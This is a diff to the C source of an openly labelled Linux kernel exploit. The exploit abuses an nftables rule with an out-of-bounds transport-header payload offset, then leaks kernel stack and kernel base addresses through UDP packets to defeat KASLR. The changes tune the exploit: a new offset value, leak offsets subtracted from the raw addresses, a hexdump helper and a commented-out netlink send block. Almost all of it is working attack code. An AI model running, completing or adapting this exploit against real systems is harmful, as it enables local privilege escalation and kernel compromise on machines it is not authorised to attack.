@@ -9,7 +9,7 @@
 #include <time.h>
 #include <string.h>
 #include <netinet/in.h>
-#include <stddef.h>
+#include <stddef.h>    /* for offsetof */
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <arpa/inet.h>
@@ -32,13 +32,13 @@ char pkt_message[512] = {0, };
 char pkt_buffer[512] = {0, };
 int pkt_port = 0;
 
-void init_cpu(void){
-    cpu_set_t set;
-    CPU_ZERO(&set);
-    CPU_SET(0, &set);
-    if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
-        perror("[-] sched_setaffinity");
-        exit(EXIT_FAILURE);    
+void hexdump(const void* data, size_t size) {
+    unsigned char *p = (unsigned char*)data;
+    for (size_t i = 0; i < size; i++) {
+        printf("%02X ", p[i]);
+        if ((i + 1) % 16 == 0 || i == size - 1) {
+            printf("\n");
+        }
     }
 }
 
@@ -101,6 +101,16 @@ void write_to_file(const char *which, const char *format, ...) {
     exit(1);
   }
   fclose(fu);
+}
+
+void init_cpu(void){
+    cpu_set_t set;
+    CPU_ZERO(&set);
+    CPU_SET(0, &set);
+    if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
+        perror("[-] sched_setaffinity");
+        exit(EXIT_FAILURE);    
+    }
 }
 
 void init_namespace(void) {
@@ -297,7 +307,7 @@ void add_rule_exploit(struct mnl_nlmsg_batch *b, int *seq, const char* table_nam
             offsetof(struct tcphdr, dest), sizeof(uint16_t));
     add_cmp(r, NFT_REG_1, NFT_CMP_EQ, &dport, sizeof(uint16_t));
 
-    add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0xffffffc8,0x8,0xf0);
+    add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0xffffffd0,0x8,0xf0);
 
     struct nlmsghdr *nlh;
     nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(b),
@@ -314,7 +324,7 @@ void add_rule_exploit(struct mnl_nlmsg_batch *b, int *seq, const char* table_nam
 int main(int argc, char *argv[])
 {
     printf("[+] exploit process starting\n");
-    
+
     init_cpu();
     init_namespace();
 
@@ -329,6 +339,7 @@ int main(int argc, char *argv[])
     seq = 100;
     batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
 
+    // HERE
     begin_batch(batch, &seq);
 
     add_table(batch, &seq, "exploit_table");
@@ -347,7 +358,29 @@ int main(int argc, char *argv[])
     check++;
 
     end_batch(batch, &seq);
+    //
+    /*
+    nl = mnl_socket_open(NETLINK_NETFILTER);
+    if (nl == NULL)
+    {
+        perror("mnl_socket_open");
+        exit(EXIT_FAILURE);
+    }
 
+    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0)
+    {
+        perror("mnl_socket_bind");
+        exit(EXIT_FAILURE);
+    }
+    portid = mnl_socket_get_portid(nl);
+
+    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
+                          mnl_nlmsg_batch_size(batch)) < 0)
+    {
+        perror("mnl_socket_send");
+        exit(EXIT_FAILURE);
+    }
+    */
     mnl_nlmsg_batch_stop(batch);
 
     n = mnl_socket_recvfrom(nl, buf, sizeof(buf));
@@ -378,7 +411,7 @@ int main(int argc, char *argv[])
     pthread_t leak_sender, leak_receiver;
     printf("[+] leak_sender -> leak_receiver (udp)\n");
     pkt_port = 1234;
-    //memset(pkt_message, 'a', 512);
+    memset(pkt_message, 'a', 512);
     pthread_create(&leak_sender, NULL, sender_thread, NULL);
     pthread_create(&leak_receiver, NULL, receiver_thread, NULL);
 
@@ -388,11 +421,12 @@ int main(int argc, char *argv[])
     unsigned long leak = 0;
 
     memcpy((char*)&leak,pkt_buffer+0x38,8);
-    unsigned long kernel_stack = leak;
+    unsigned long kernel_stack = leak - 0x1bfb48;
     printf("0x%lx\n", leak);
     memcpy((char*)&leak,pkt_buffer+0x40,8);
     printf("0x%lx\n", leak);
-    unsigned long kernel_base = leak;
+    unsigned long kernel_base = leak - 0x6744e;
+    //hexdump(pkt_buffer, 48);
     leak = leak & 0xffffffffff000000;
     kernel_stack = kernel_stack & 0xffffff0000000000;
     kernel_base = leak;
